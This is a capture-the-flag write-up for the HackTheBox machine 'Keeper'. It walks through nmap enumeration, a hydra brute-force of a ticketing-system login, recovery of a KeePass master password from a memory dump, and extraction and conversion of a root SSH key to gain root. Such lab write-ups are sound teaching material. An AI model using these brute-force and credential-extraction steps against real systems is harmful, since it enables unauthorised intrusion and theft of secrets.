---
tags:
  - hack
  - linux
---
# HackTheBox: [Keeper](https://app.hackthebox.com/machines/Keeper)

## Enumeration

```console
$ sudo nmap -n -sC -sV -F $t
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 12:13 CST
Nmap scan report for 10.10.11.227
Host is up (0.14s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

`curl` point me toward `tickets.keeper.htb`:

```console
$ curl -si $t
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 03 Oct 2023 18:14:39 GMT
Content-Type: text/html
Content-Length: 149
Last-Modified: Wed, 24 May 2023 14:04:44 GMT
Connection: keep-alive
ETag: "646e197c-95"
Accept-Ranges: bytes

<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
```

I update `/etc/hosts` so that I may access the vhost:

```console
$ grep keeper /etc/hosts
10.10.11.227 tickets.keeper.htb
```

And:

![](_/htb-keeper-20231002-1.png)

I try `admin:admin` and capture the results using Burp:

![](_/htb-keeper-20231002-2.png)

## Exploitation

I'm able to brute-force the credentials `root:password`:[^1]

```console
$ hydra tickets.keeper.htb http-form-post "/rt/NoAuth/Login.html:user=^USER^&pass=^PASS^:password is incorrect" -l root -P /usr/share/seclists/Passwords/cirt-default-passwords.txt
[...]
[DATA] attacking http-post-form://tickets.keeper.htb:80/rt/NoAuth/Login.html:user=^USER^&pass=^PASS^:password is incorrect
[80][http-post-form] host: tickets.keeper.htb   login: root   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-03 12:42:47
```

The `http://tickets.keeper.htb/rt/` ticketing interface has one ticket from a user who attached a memory dump from KeePass, a password manager utility.

![](_/htb-keeper-20231002-3.png)

Looking at the user data for the ticket requester, there is a default password:

![](_/htb-keeper-20231002-4.png)

These credentials work for `ssh` on the target:

```console
$ ssh lnorgaard@$t
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ cat user.txt
e7880b[...]
```

## Privilege Escalation

The KeePass dump mentioned in the ticket is also available in the user's homedir:

```console
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ unzip -l RT30000.zip 
Archive:  RT30000.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
253395188  2023-05-24 12:51   KeePassDumpFull.dmp
     3630  2023-05-24 12:51   passcodes.kdbx
---------                     -------
253398818                     2 files
```

Running [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper) on the memory dump reveals most of the password:

```text
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M,
3.:     d,
4.:     g,
5.:     r,
6.:     ø,
7.:     d,
8.:      ,
9.:     m,
10.:    e,
11.:    d,
12.:     ,
13.:    f,
14.:    l,
15.:    ø,
16.:    d,
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

Using Google, I'm able to find out that the fragment `M}dgrød med fløde` looks a lot like the phrase `Rødgrød med fløde`, a Danish food. This works, with a lowercase 'r': `rødgrød med fløde`. With that password I'm able to import data into the KeePass app:

![](_/htb-keeper-20231002-5.png)

`root` password: `F4><3K0nd!`…but it doesn't work for `ssh`.

The full KeePass data for `root` user:

```text
Group: Network, Title: keeper.htb (Ticketing Server), User Name: root, Password: ********, Creation Time: 5/19/2023 2:36:50 AM, Last Modification Time: 5/24/2023 4:48:21 AM

PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
[...]
```

That key is in PPK format, and needs to be in a format suitable for OpenSSH.

```console
$ puttygen foo.ppk -O private-openssh -o id_rsa

$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
[...]
-----END RSA PRIVATE KEY-----

$ ssh -i id_rsa root@$t
[...]
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# cat root.txt
fc94c7[...]
```
